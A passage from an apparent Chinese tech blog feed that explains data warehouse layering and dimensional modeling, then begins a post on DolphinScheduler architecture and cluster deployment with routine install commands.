层，是最接近数据源中数据的一层，为了考虑后续可能需要追溯数据问题，因此对于这一层就不建议做过多的数据清洗工作，原封不动地接入原始数据即可，至于数据的去噪、去重、异常值处理等过程可以放在后面的 DWD 层来做</p><h3 id="1-3-数据仓库层：DW（Data-Warehouse）">1.3 数据仓库层：DW（Data Warehouse）</h3><p>数据仓库层是我们在做数据仓库时要核心设计的一层，在这里，从 ODS 层中获得的数据按照主题建立各种数据模型。DW 层又细分为 <strong>DWD</strong>（Data Warehouse Detail）层、<strong>DWM</strong>（Data WareHouse Middle）层和 <strong>DWS</strong>（Data WareHouse Servce） 层</p><ul><li><strong>数据明细层：DWD（Data Warehouse Detail）</strong></li></ul><p>该层一般保持和 ODS 层一样的数据粒度，并且提供一定的数据质量保证。<strong>DWD 层要做的就是将数据清理、整合、规范化、脏数据、垃圾数据、规范不一致的、状态定义不一致的、命名不规范的数据都会被处理</strong>。同时，为了提高数据明细层的易用性，<strong>该层会采用一些维度退化手法，将维度退化至事实表中，减少事实表和维表的关联</strong>。另外，在该层也会做一部分的数据聚合，将相同主题的数据汇集到一张表中，提高数据的可用性</p><ul><li><strong>数据中间层：DWM（Data WareHouse Middle）</strong></li></ul><p>该层会在 DWD 层的数据基础上，数据做轻度的聚合操作，生成一系列的中间表，提升公共指标的复用性，减少重复加工。直观来讲，<strong>就是对通用的核心维度进行聚合操作，算出相应的统计指标</strong>。</p><p>在实际计算中，如果直接从 DWD 或者 ODS 计算出宽表的统计指标，会存在计算量太大并且维度太少的问题，因此一般的做法是，在 DWM 层先计算出多个小的中间表，然后再拼接成一张 DWS 的宽表。由于宽和窄的界限不易界定，也可以去掉 DWM 这一层，只留 DWS 层，将所有的数据再放在 DWS 亦可</p><ul><li><strong>数据服务层：DWS（Data WareHouse Servce）</strong></li></ul><p>DWS 层为公共汇总层，会进行轻度汇总，粒度比明细数据稍粗，基于 DWD 层上的基础数据，<strong>整合汇总成分析某一个主题域的服务数据，一般是宽表</strong>。DWS 层应覆盖 80% 的应用场景。又称数据集市或宽表。按照业务划分，如主题域流量、订单、用户等，生成字段比较多的宽表，用于提供后续的业务查询，OLAP 分析，数据分发等。</p><p>一般来讲，该层的数据表会相对比较少，一张表会涵盖比较多的业务内容，由于其字段较多，因此一般也会称该层的表为宽表</p><h3 id="1-4-维表层：DIM（Dimension）">1.4 维表层：DIM（Dimension）</h3><p>如果维表过多，也可针对维表设计单独一层，维表层主要包含两部分数据：</p><p><strong>高基数维度数据</strong>：一般是用户资料表、商品资料表类似的资料表。数据量可能是千万级或者上亿级别。</p><p><strong>低基数维度数据</strong>：一般是配置表，比如枚举值对应的中文含义，或者日期维表。 数据量可能是个位数或者几千几万</p><h3 id="1-5-数据应用层：ADS（Application-Data-Services）">1.5 数据应用层：ADS（Application Data Services）</h3><p>主要是提供给数据产品和数据分析使用的数据，一般会存放在 ES、 PostgreSql、Redis 等系统中供线上系统使用，也可能会存在 Hive 或者 Druid 中供数据分析和数据挖掘使用。比如我们经常说的报表数据，一般就放在这里。</p><h2 id="2、数仓建模方法概述">2、数仓建模方法概述</h2><h3 id="2-1-范式建模法（Third-Normal-Form，3NF）">2.1 范式建模法（Third Normal Form，3NF）</h3><p>范式建模法其实是我们在构建数据模型常用的一个方法，该方法的主要由 Inmon 所提倡，主要解决关系型数据库的数据存储，利用的一种技术层面上的方法。目前，我们在关系型数据库中的建模方法，大部分采用的是三范式建模法。</p><p>范式 是符合某一种级别的关系模式的集合。构造数据库必须遵循一定的规则，而在关系型数据库中这种规则就是范式，这一过程也被称为规范化。目前关系数据库有六种范式：第一范式（1NF）、第二范式（2NF）、第三范式（3NF）、Boyce-Codd范式（BCNF）、第四范式（4NF）和第五范式（5NF）。在数据仓库的模型设计中，一般采用第三范式。一个符合第三范式的关系必须具有以下三个条件 :</p><ul><li>每个属性值唯一，不具有多义性 ;</li><li>每个非主属性必须完全依赖于整个主键，而非主键的一部分 ;</li><li>每个非主属性不能依赖于其他关系中的属性，因为这样的话，这种属性应该归到其他关系中去。</li></ul><h3 id="2-2-维度建模法（Dimensional-Modeling）">2.2 维度建模法（Dimensional Modeling）</h3><p>维度模型是数据仓库领域另一位大师Ralph Kimall所倡导，他的《数据仓库工具箱》是数据仓库工程领域最流行的数仓建模经典。维度建模以分析决策的需求出发构建模型，构建的数据模型为分析需求服务，因此它重点解决用户如何更快速完成分析需求，同时还有较好的大规模复杂查询的响应性能。</p><p>典型的代表是我们比较熟知的<strong>星形模型（Star-schema）</strong>，以及在一些特殊场景下适用的<strong>雪花模型（Snow-schema）</strong>。维度建模中比较重要的概念就是 <strong>事实表（Fact table）和维度表（Dimension table）</strong>。其最简单的描述就是，按照事实表、维度表来构建数据仓库、数据集市。</p><h3 id="2-3-实体建模法（Entity-Modeling）">2.3 实体建模法（Entity Modeling）</h3><p>实体建模法并不是数据仓库建模中常见的一个方法，它来源于哲学的一个流派。从哲学的意义上说，客观世界应该是可以细分的，客观世界应该可以分成由一个个实体，以及实体与实体之间的关系组成。那么我们在数据仓库的建模过程中完全可以引入这个抽象的方法，将整个业务也可以划分成一个个的实体，而每个实体之间的关系，以及针对这些关系的说明就是我们数据建模需要做的工作。</p><p>虽然实体法粗看起来好像有一些抽象，其实理解起来很容易。即我们可以将任何一个业务过程划分成 3 个部分，<strong>实体，事件，说明</strong></p><h2 id="3、维度建模详解">3、维度建模详解</h2><h3 id="3-1-概述">3.1 概述</h3><p>维度建模分为两种表：事实表和维度表：</p><ul><li><p><strong>事实表</strong>：必然存在的一些数据，像采集的日志文件，订单表，都可以作为事实表 。  </p><p>特征：是一堆主键的集合，每个主键对应维度表中的一条记录，客观存在的，根据主题确定出需要使用的数据</p></li><li><p><strong>维度表</strong>：维度就是所分析的数据的一个量，维度表就是以合适的角度来创建的表，分析问题的一个角度：时间、地域、终端、用户等角度</p></li></ul><h3 id="3-2-事实表详解">3.2 事实表详解</h3><p>发生在现实世界中的操作型事件，其所产生的可度量数值，存储在事实表中。从最低的粒度级别来看，事实表行对应一个度量事件，反之亦然。<strong>事实表表示对分析主题的度量</strong>。比如一次购买行为我们就可以理解为是一个事实</p><p><img src="http://qnypic.shawncoding.top/blog/202404151823419.png" alt></p><p>图中的订单表就是一个事实表，你可以理解他就是在现实中发生的一次操作型事件，我们每完成一个订单，就会在订单中增加一条记录。 事实表的特征：表里没有存放实际的内容，他是一堆主键的集合，这些ID分别能对应到维度表中的一条记录。事实表包含了与各维度表相关联的外键，可与维度表关联。事实表的度量通常是数值类型，且记录数会不断增加，表数据规模迅速增长</p><p><strong>明细表（宽表）</strong></p><p>事实表的数据中，有些属性共同组成了一个字段（糅合在一起），比如年月日时分秒构成了时间,当需要根据某一属性进行分组统计的时候，需要截取拼接之类的操作，效率极低。<strong>为了分析方便，可以事实表中的一个字段切割提取多个属性出来构成新的字段，因为字段变多了，所以称为宽表，原来的成为窄表</strong>；又因为宽表的信息更加清晰明细，所以也可以称之为明细表</p><p><strong>事实表种类</strong>分为六类</p><ul><li><strong>事务事实表</strong></li></ul><p>表中的一行对应空间或时间上某点的度量事件。就是一行数据中必须有度量字段，什么是度量，就是指标，比如说销售金额，销售数量等这些可加的或者半可加就是度量值。另一点就是事务事实表都包含一个与维度表关联的外键。并且度量值必须和事务粒度保持一致</p><ul><li><strong>周期快照事实表</strong></li></ul><p>顾名思义，周期事实表就是每行都带有时间值字段，代表周期，通常时间值都是标准周期，如某一天，某周，某月等。粒度是周期，而不是个体的事务，也就是说一个周期快照事实表中数据可以是多个事实，但是它们都属于某个周期内</p><ul><li><strong>累计快照事实表</strong></li></ul><p>周期快照事实表是单个周期内数据，而累计快照事实表是由多个周期数据组成，每行汇总了过程开始到结束之间的度量。每行数据相当于管道或工作流，有事件的起点，过程，终点，并且每个关键步骤都包含日期字段。如订单数据，累计快照事实表的一行就是一个订单，当订单产生时插入一行，当订单发生变化时，这行就被修改</p><ul><li><strong>无事实的事实表</strong></li></ul><p>我们以上讨论的事实表度量都是数字化的，当然实际应用中绝大多数都是数字化的度量，但是也可能会有少量的没有数字化的值但是还很有价值的字段，无事实的事实表就是为这种数据准备的，利用这种事实表可以分析发生了什么。</p><ul><li><strong>聚集事实表</strong></li></ul><p>聚集，就是对原子粒度的数据进行简单的聚合操作，目的就是为了提高查询性能。如我们需求是查询全国所有门店的总销售额，我们原子粒度的事实表中每行是每个分店每个商品的销售额，聚集事实表就可以先聚合每个分店的总销售额，这样汇总所有门店的销售额时计算的数据量就会小很多。</p><ul><li><strong>合并事实表</strong></li></ul><p>这种事实表遵循一个原则，就是相同粒度，数据可以来自多个过程，但是只要它们属于相同粒度，就可以合并为一个事实表，这类事实表特别适合经常需要共同分析的多过程度量</p><h3 id="3-3-维度表">3.3 维度表</h3><p>每个维度表都包含单一的主键列。维度表的主键可以作为与之关联的任何事实表的外键，当然，维度表行的描述环境应与事实表行完全对应。维度表通常比较宽，是扁平型非规范表，包含大量的低粒度的文本属性。维度表示你要对数据进行分析时所用的一个量，比如你要分析产品销售情况， 你可以选择按类别来进行分析，或按区域来分析。每个类别就构成一个维度。上图中的用户表、商家表、时间表这些都属于维度表，这些表都有一个唯一的主键，然后在表中存放了详细的数据信息。</p><p>总的说来，在数据仓库中不需要严格遵守规范化设计原则。因为数据仓库的主导功能就是面向分析，以查询为主，不涉及数据更新操作。<strong>事实表的设计是以能够正确记录历史信息为准则，维度表的设计是以能够以合适的角度来聚合主题内容为准则</strong>。</p><ul><li><strong>维度表结构</strong></li></ul><p>维度表谨记一条原则，包含单一主键列，但有时因业务复杂，也可能出现联合主键，请尽量避免，如果无法避免，也要确保必须是单一的，这很重要，如果维表主键不是单一，和事实表关联时会出现数据发散，导致最后结果可能出现错误。维度表通常比较宽，包含大量的低粒度的文本属性。</p><ul><li><strong>跨表钻取</strong></li></ul><p>跨表钻取意思是当每个查询的行头都包含相同的一致性属性时，使不同的查询能够针对两个或更多的事实表进行查询，钻取可以改变维的层次，变换分析的粒度。它包括上钻/下钻：</p><p>上钻（roll-up）：上卷是沿着维的层次向上聚集汇总数据。例如，对产品销售数据，沿着时间维上卷，可以求出所有产品在所有地区每月（或季度或年或全部）的销售额。</p><p>下钻（drill-down）：下钻是上钻的逆操作，它是沿着维的层次向下，查看更详细的数据。</p><ul><li><strong>退化维度</strong></li></ul><p>退化维度就是将维度退回到事实表中。因为有时维度除了主键没有其他内容，虽然也是合法维度键，但是一般都会退回到事实表中，减少关联次数，提高查询性能</p><ul><li><strong>多层次维度</strong></li></ul><p>多数维度包含不止一个自然层次，如日期维度可以从天的层次到周到月到年的层次。所以在有些情况下，在同一维度中存在不同的层次。</p><ul><li><strong>维度表空值属性</strong></li></ul><p>当给定维度行没有被全部填充时，或者当存在属性没有被应用到所有维度行时，将产生空值维度属性。上述两种情况，推荐采用描述性字符串代替空值，如使用 unknown 或 not applicable 替换空值。</p><ul><li><strong>日历日期维度</strong></li></ul><p>在日期维度表中，主键的设置不要使用顺序生成的id来表示，可以使用更有意义的数据表示，比如将年月日合并起来表示，即YYYYMMDD，或者更加详细的精度</p><h3 id="3-5-维度建模三种模式">3.5 维度建模三种模式</h3><p><strong>规范化</strong>是指使用一系列范式设计数据库的过程，其目的是减少数据冗余，增强数据的一致性。通常情况下，规范化之后，一张表的字段会拆分到多张表。</p><p><strong>反规范化</strong>是指将多张表的数据冗余到一张表，其目的是减少join操作，提高查询性能。在设计维度表时，如果对其进行规范化，得到的维度模型称为雪花模型，如果对其进行反规范化，得到的模型称为星型模型</p><ul><li><strong>星型模式</strong></li></ul><p>星形模式(Star Schema)是最常用的维度建模方式。<strong>星型模式是以事实表为中心，所有的维度表直接连接在事实表上，像星星一样</strong>。 星形模式的维度建模由一个事实表和一组维表成，且具有以下特点： a. 维表只和事实表关联，维表之间没有关联； b. 每个维表主键为单列，且该主键放置在事实表中，作为两边连接的外键； c. 以事实表为核心，维表围绕核心呈星形</p><ul><li><strong>雪花模式</strong></li></ul><p>雪花模式(Snowflake Schema)是对星形模式的扩展。<strong>雪花模式的维度表可以拥有其他维度表的</strong>，虽然这种模型相比星型更规范一些，但是由于这种模型不太容易理解，维护成本比较高，而且性能方面需要关联多层维表，性能也比星型模型要低。所以一般不是很常用</p><ul><li><strong>星座模式</strong></li></ul><p>星座模式是星型模式延伸而来，星型模式是基于一张事实表的，而<strong>星座模式是基于多张事实表的，而且共享维度信息</strong>。 前面介绍的两种维度建模方法都是多维表对应单事实表，但在很多时候维度空间内的事实表不止一个，而一个维表也可能被多个事实表用到。在_业务发展后期，绝大部分维度建模都采用的是星座模式_</p><h3 id="3-6-维度建模过程">3.6 维度建模过程</h3><p><strong>1、选择业务过程</strong></p><p>维度建模是紧贴业务的，所以必须以业务为根基进行建模，那么选择业务过程，顾名思义就是在整个业务流程中选取我们需要建模的业务，根据运营提供的需求及日后的易扩展性等进行选择业务。比如商城，整个商城流程分为商家端，用户端，平台端，运营需求是总订单量，订单人数，及用户的购买情况等，我们选择业务过程就选择用户端的数据，商家及平台端暂不考虑。业务选择非常重要，因为后面所有的步骤都是基于此业务数据展开的。</p><p><strong>2、声明粒度</strong></p><p>先举个例子：对于用户来说，一个用户有一个身份证号，一个户籍地址，多个手机号，多张银行卡，那么与用户粒度相同的粒度属性有身份证粒度，户籍地址粒度，比用户粒度更细的粒度有手机号粒度，银行卡粒度，存在一对一的关系就是相同粒度。为什么要提相同粒度呢，因为维度建模中要求我们，在<strong>同一事实表</strong>中，必须具有<strong>相同的粒度</strong>，同一事实表中不要混用多种不同的粒度，不同的粒度数据建立不同的事实表。并且从给定的业务过程获取数据时，强烈建议从关注原子粒度开始设计，也就是从最细粒度开始，因为原子粒度能够承受无法预期的用户查询。但是上卷汇总粒度对查询性能的提升很重要的，所以对于有明确需求的数据，我们建立针对需求的上卷汇总粒度，对需求不明朗的数据我们建立原子粒度。</p><p><strong>3、确认维度</strong></p><p>维度表是作为业务分析的入口和描述性标识，所以也被称为数据仓库的“灵魂”。在一堆的数据中怎么确认哪些是维度属性呢，如果该列是对具体值的描述，是一个文本或常量，某一约束和行标识的参与者，此时该属性往往是维度属性，数仓工具箱中告诉我们<strong>牢牢掌握事实表的粒度，就能将所有可能存在的维度区分开</strong>，并且要<strong>确保维度表中不能出现重复数据，应使维度主键唯一</strong></p><p><strong>4、确认事实</strong></p><p>事实表是用来度量的，基本上都以数量值表示，事实表中的每行对应一个度量，每行中的数据是一个特定级别的细节数据，称为粒度。维度建模的核心原则之一<strong>是同一事实表中的所有度量必须具有相同的粒度</strong>。这样能确保不会出现重复计算度量的问题。有时候往往不能确定该列数据是事实属性还是维度属性。记住<strong>最实用的事实就是数值类型和可加类事实</strong>。所以可以通过分析该列是否是一种包含多个值并作为计算的参与者的度量，这种情况下该列往往是事实。</p><h2 id="4、维度建模理论之维度表">4、维度建模理论之维度表</h2><h3 id="4-1-维度表设计步骤">4.1 维度表设计步骤</h3><ul><li><strong>确定维度（表）</strong></li></ul><p>在设计事实表时，已经确定了与每个事实表相关的维度，理论上每个相关维度均需对应一张维度表。需要注意到，可能存在多个事实表与同一个维度都相关的情况，这种情况需保证维度的唯一性，即只创建一张维度表。另外，如果某些维度表的维度属性很少，例如只有一个名称，则可不创建该维度表，而把该表的维度属性直接增加到与之相关的事实表中，这个操作称为<strong>维度退化</strong></p><ul><li><strong>确定主维表和相关维表</strong></li></ul><p>此处的主维表和相关维表均指<strong>业务系统</strong>中与某维度相关的表。例如业务系统中与商品相关的表有sku_info，spu_info，base_trademark，base_category3，base_category2，base_category1等，其中sku_info就称为商品维度的主维表，其余表称为商品维度的相关维表。维度表的粒度通常与主维表相同。</p><ul><li><strong>确定维度属性</strong></li></ul><p>确定维度属性即确定维度表字段。维度属性主要来自于业务系统中与该维度对应的主维表和相关维表。维度属性可直接从主维表或相关维表中选择，也可通过进一步加工得到。确定维度属性时，需要遵循以下要求：</p><p><strong>（1）尽可能生成丰富的维度属性</strong>。维度属性是后续做分析统计时的查询约束条件、分组字段的基本来源，是数据易用性的关键。维度属性的丰富程度直接影响到数据模型能够支持的指标的丰富程度。</p><p><strong>（2）尽量不使用编码，而使用明确的文字说明，一般可以编码和文字共存。</strong></p><p>**（3）尽量沉淀出通用的维度属性。**有些维度属性的获取需要进行比较复杂的逻辑处理，例如需要通过多个字段拼接得到。为避免后续每次使用时的重复处理，可将这些维度属性沉淀到维度表中</p><h3 id="4-2-维度变化">4.2 维度变化</h3><p>维度属性通常不是静态的，而是会随时间变化的，数据仓库的一个重要特点就是反映历史的变化，所以如何保存维度的历史状态是维度设计的重要工作之一。保存维度数据的历史状态，通常有以下两种做法，分别是全量快照表和拉链表。</p><p><strong>1）全量快照表</strong></p><p>离线数据仓库的计算周期通常为每天一次，所以可以每天保存一份全量的维度数据。这种方式的优点和缺点都很明显。</p><p>优点是简单而有效，开发和维护成本低，且方便理解和使用。</p><p>缺点是浪费存储空间，尤其是当数据的变化比例比较低时。</p><p><strong>2）拉链表</strong></p><p>拉链表的意义就在于能够更加高效的保存维度信息的历史状态。拉链表，<strong>记录每条信息的生命周期</strong>，一旦一条记录的生命周期结束，就重新开始一条新的记录，并把当前日期放入生效开始日期。如果当前信息至今有效，在生效结束日期中填入一个<strong>极大值</strong>（如9999-12-31 )。</p><p><img src="http://qnypic.shawncoding.top/blog/202404151823421.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202404151823422.png" alt></p><h3 id="4-3-多值维度">4.3 多值维度</h3><p>如果事实表中一条记录在某个维度表中有多条记录与之对应，称为多值维度。例如，下单事实表中的一条记录为一个订单，一个订单可能包含多个商品，所会商品维度表中就可能有多条数据与之对应。针对这种情况，通常采用以下两种方案解决。</p><p><strong>第一种：降低事实表的粒度，例如将订单事实表的粒度由一个订单降低为一个订单中的一个商品项。</strong></p><p>第二种：在事实表中采用多字段保存多个维度值，每个字段保存一个维度id。这种方案只适用于多值维度个数固定的情况。</p><p>建议尽量采用第一种方案解决多值维度问题。</p><h3 id="4-4-多值属性">4.4 多值属性</h3><p>维表中的某个属性同时有多个值，称之为“多值属性”，例如商品维度的平台属性和销售属性，每个商品均有多个属性值。针对这种情况，通常有可以采用以下两种方案。</p><p>第一种：将多值属性放到一个字段，该字段内容为key1:value1，key2:value2的形式，例如一个手机商品的平台属性值为“品牌:华为，系统:鸿蒙，CPU:麒麟990”。</p><p>第二种：将多值属性放到多个字段，每个字段对应一个属性。这种方案只适用于多值属性个数固定的情况</p><h2 id="5、数据仓库设计">5、数据仓库设计</h2><h3 id="5-1-数据仓库构建流程">5.1 数据仓库构建流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202404151823423.png" alt></p><h3 id="5-2-数据调研">5.2 数据调研</h3><p>业务调研的主要目标是<strong>熟悉业务流程</strong>、<strong>熟悉业务数据</strong>，例如</p><p><img src="http://qnypic.shawncoding.top/blog/202404151823424.png" alt></p><p>分析需求时，需要明确需求所需的<strong>业务过程</strong>及<strong>维度</strong>，例如该需求所需的业务过程就是买家下单，所需的维度有日期，省份，商品品类。做完业务分析和需求分析之后，要保证每个需求都能找到与之对应的业务过程及维度。若现有数据无法满足需求，则需要和业务方进行沟通，例如某个页面需要新增某个行为的埋点</p><h3 id="5-3-明确数据域">5.3 明确数据域</h3><p>数据仓库模型设计除横向的分层外，通常也需要根据业务情况进行纵向划分数据域。划分数据域的意义是<strong>便于数据的管理和应用</strong>。通常可以根据业务过程或者部门进行划分，本项目根据业务过程进行划分，需要注意的是一个业务过程只能属于一个数据域。下面是本数仓项目所需的所有业务过程及数据域划分详情</p><table><thead><tr><th><strong>数据域</strong></th><th><strong>业务过程</strong></th></tr></thead><tbody><tr><td><strong>交易域</strong></td><td>加购、下单、取消订单、支付成功、退单、退款成功</td></tr><tr><td><strong>流量域</strong></td><td>页面浏览、启动应用、动作、曝光、错误</td></tr><tr><td><strong>用户域</strong></td><td>注册、登录</td></tr><tr><td><strong>互动域</strong></td><td>收藏、评价</td></tr><tr><td><strong>工具域</strong></td><td>优惠券领取、优惠券使用（下单）、优惠券使用（支付）</td></tr></tbody></table><h3 id="5-4-构建业务总线矩阵">5.4 构建业务总线矩阵</h3><p>业务总线矩阵中包含维度模型所需的所有事实（业务过程）以及维度，以及各业务过程与各维度的关系。矩阵的行是一个个业务过程，矩阵的列是一个个的维度，行列的交点表示业务过程与维度的关系</p><p><img src="http://qnypic.shawncoding.top/blog/202404151823425.png" alt></p><p>一个业务过程对应维度模型中一张事务型事实表，一个维度则对应维度模型中的一张维度表。所以构建业务总线矩阵的过程就是设计维度模型的过程。但是需要注意的是，总线矩阵中通常只包含事务型事实表，另外两种类型的事实表需单独设计。按照事务型事实表的设计流程，<strong>选择业务过程à</strong>声明粒度<strong>à</strong>确认维度<strong>à</strong>确认事实</p><h3 id="5-5-明确统计指标">5.5 明确统计指标</h3><ul><li><strong>原子指标</strong></li></ul><p>原子指标基于某一<strong>业务过程</strong>的<strong>度量值</strong>，是业务定义中不可再拆解的指标，原子指标的核心功能就是对指标的<strong>聚合逻辑</strong>进行了定义。我们可以得出结论，原子指标包含三要素，分别是业务过程、度量值和聚合逻辑。</p><p>例如<strong>订单总额</strong>就是一个典型的原子指标，其中的业务过程为用户下单、度量值为订单金额，聚合逻辑为sum()求和。需要注意的是原子指标只是用来辅助定义指标一个概念，通常不会对应有实际统计需求与之对应。</p><ul><li><strong>派生指标</strong></li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151823426.png" alt></p><ul><li><strong>衍生指标</strong></li></ul><p>衍生指标是在一个或多个派生指标的基础上，通过各种逻辑运算复合而成的。例如比率、比例等类型的指标。衍生指标也会对应实际的统计需求</p><p><img src="http://qnypic.shawncoding.top/blog/202404151823427.png" alt></p><p>当统计需求足够多时，必然会出现部分统计需求对应的派生指标相同的情况。这种情况下，我们就可以考虑将这些公共的派生指标保存下来，这样做的主要目的就是减少重复计算，提高数据的复用性。这些公共的派生指标统一保存在数据仓库的DWS层。因此DWS层设计，就可以参考我们根据现有的统计需求整理出的派生指标</p><h3 id="5-6-维度模型设计">5.6 维度模型设计</h3><p>维度模型的设计参照上述得到的业务总线矩阵即可。事实表存储在DWD层，维度表存储在DIM层</p><h3 id="5-7-汇总模型设计">5.7 汇总模型设计</h3><p>汇总模型的设计参考上述整理出的指标体系（主要是派生指标）即可。汇总表与派生指标的对应关系是，<strong>一张汇总</strong>表通常<strong>包含</strong>业务过程相同、统计周期相同、统计粒度相同的<strong>多个派生指标</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;一、数仓概述&lt;/h1&gt;
&lt;h2 id=&quot;1、数据仓库概念&quot;&gt;1、数据仓库概念&lt;/h2&gt;
&lt;h3 id=&quot;1-1-概述&quot;&gt;1.1 概述&lt;/h3&gt;
&lt;p&gt;通常数据仓库的数据来自各个业务应用系统。业务系统中的数据形式多种多样，可能是 Oracle、MySQL、SQL Server等关系数据库里的结构化数据，可能是文本、CSV等平面文件或Word、Excel文档中的数据，还可能是HTML、XML等自描述的半结构化数据。这些业务数据经过一系列的数据抽取、转换、清洗，最终以一种统一的格式装载进数据仓库。数据仓库里的数据作为分析用的数据源，提供给后面的即席查询、 分析系统、数据集市、报表系统、数据挖掘系统等。&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>大数据几种任务调度工具</title>
    <link href="https://blog.shawncoding.top/posts/4fdd5207.html"/>
    <id>https://blog.shawncoding.top/posts/4fdd5207.html</id>
    <published>2024-05-31T08:23:00.000Z</published>
    <updated>2024-05-31T08:34:26.193Z</updated>
    
    <content type="html"><![CDATA[<h1>一、DolphinScheduler概述和部署</h1><blockquote><p>官网：<a href="https://dolphinscheduler.apache.org/" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/">https://dolphinscheduler.apache.org/</a></p></blockquote><h2 id="1、DolphinScheduler简介">1、DolphinScheduler简介</h2><h3 id="1-1-概述">1.1 概述</h3><p>Apache DolphinScheduler是一个分布式、易扩展的可视化DAG工作流任务调度平台。致力于解决数据处理流程中错综复杂的依赖关系，使调度系统在数据处理流程中开箱即用</p><a id="more"></a><h3 id="1-2-核心架构">1.2 核心架构</h3><p>DolphinScheduler的主要角色如下：</p><ul><li><strong>MasterServer</strong>采用分布式无中心设计理念，MasterServer主要负责 DAG 任务切分、任务提交、任务监控，并同时监听其它MasterServer和WorkerServer的健康状态</li><li><strong>WorkerServer</strong>也采用分布式无中心设计理念，WorkerServer主要负责任务的执行和提供日志服务</li><li><strong>ZooKeeper</strong>服务，系统中的MasterServer和WorkerServer节点都通过ZooKeeper来进行集群管理和容错</li><li><strong>Alert</strong>服务，提供告警相关服务</li><li><strong>API</strong>接口层，主要负责处理前端UI层的请求</li><li><strong>UI</strong>，系统的前端页面，提供系统的各种可视化操作界面</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202404151822485.png" alt></p><h2 id="2、DolphinScheduler部署模式">2、DolphinScheduler部署模式</h2><blockquote><p><a href="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/%E9%83%A8%E7%BD%B2%E6%8C%87%E5%8D%97_menu" target="_blank" rel="noopener" title="https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/部署指南_menu">https://dolphinscheduler.apache.org/zh-cn/docs/2.0.3/部署指南_menu</a></p></blockquote><h3 id="2-1-概述">2.1 概述</h3><p>DolphinScheduler支持多种部署模式，包括单机模式（Standalone）、伪集群模式（Pseudo-Cluster）、集群模式（Cluster）等</p><h3 id="2-2-单机模式">2.2 单机模式</h3><p>单机模式（standalone）模式下，所有服务均集中于一个StandaloneServer进程中，并且其中内置了注册中心Zookeeper和数据库H2。只需配置JDK环境，就可一键启动DolphinScheduler，快速体验其功能</p><p>由于DolphinScheduler的单机模式使用的是内置的ZK和数据库，故在集群模式下所做的相关配置在单机模式下并不可见，所以需要重新配置，必要的配置为创建租户和创建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/dolphinscheduler-daemon.sh start standalone-server</span><br></pre></td></tr></table></figure><h3 id="2-3-伪集群模式">2.3 伪集群模式</h3><p>伪集群模式（Pseudo-Cluster）是在单台机器部署 DolphinScheduler 各项服务，该模式下master、worker、api server、logger server等服务都只在同一台机器上。Zookeeper和数据库需单独安装并进行相应配置</p><h3 id="2-4-集群模式">2.4 集群模式</h3><p>集群模式（Cluster）与伪集群模式的区别就是在多台机器部署 DolphinScheduler各项服务，并且可以配置多个Master及多个Worker</p><h2 id="3、DolphinScheduler集群模式部署">3、DolphinScheduler集群模式部署</h2><h3 id="3-1-集群规划与准备">3.1 集群规划与准备</h3><ul><li>三台节点均需部署JDK（1.8+），并配置相关环境变量</li><li>需部署数据库，支持MySQL（5.7+）或者PostgreSQL（8.2.15+）。如 MySQL 则需要 JDBC Driver 8.0.16</li><li>需部署Zookeeper（3.4.6+）</li><li>如果启用 HDFS 文件系统，则需要 Hadoop（2.6+）环境</li><li>三台节点均需安装进程管理工具包psmisc</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y psmisc</span><br></pre></td></tr></table></figure><h3 id="3-2-下载与配置部署脚本">3.2 下载与配置部署脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/dolphinscheduler/2.0.3/apache-dolphinscheduler-2.0.3-bin.tar.gz</span><br><span class="line">tar -zxvf apache-dolphinscheduler-2.0.3-bin.tar,gz</span><br></pre></td></tr></table></figure><p>修改解压目录下的conf/config目录下的install_config.conf文件，不需要修改的可以直接略过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 